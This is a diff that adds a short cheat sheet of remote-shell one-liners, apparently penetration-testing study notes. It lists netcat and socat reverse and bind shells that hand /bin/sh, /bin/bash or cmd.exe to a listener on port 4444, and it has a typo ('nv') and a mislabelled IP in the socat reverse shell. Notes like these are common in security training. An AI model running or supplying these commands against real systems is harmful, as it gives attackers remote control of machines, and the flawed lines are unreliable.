@@ -1,0 +1,44 @@
+-------------------------------------------------------------------
+
+** Netcat reverse shell **
+
+Remote machine:
+$ nc -nv local_machine_ip 4444 -e /bin/sh
+
+Local machine
+$ nv -nvlp 4444 
+
+-------------------------------------------------------------------
+
+** Netcat bind shell **
+
+Remote machine:
+C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
+
+Local machine
+$nc -nv remote_machine_ip 4444
+
+-------------------------------------------------------------------
+
+** Socat bind shell
+
+Remote machine
+$ socat TCP-LISTEN:4444 EXEC:/bin/sh
+
+Local machine
+$ socat - TCP4:remote_machine_ip:4444
+
+-------------------------------------------------------------------
+
+** Socat Reverse shell
+
+Local machine
+$ socat -d -d TCP-LISTEN:4444 STDOUT
+
+Remote machine
+$ socat TCP4:remote_machine_ip:4444 EXEC:/bin/bash
+
+-------------------------------------------------------------------
+
+
+
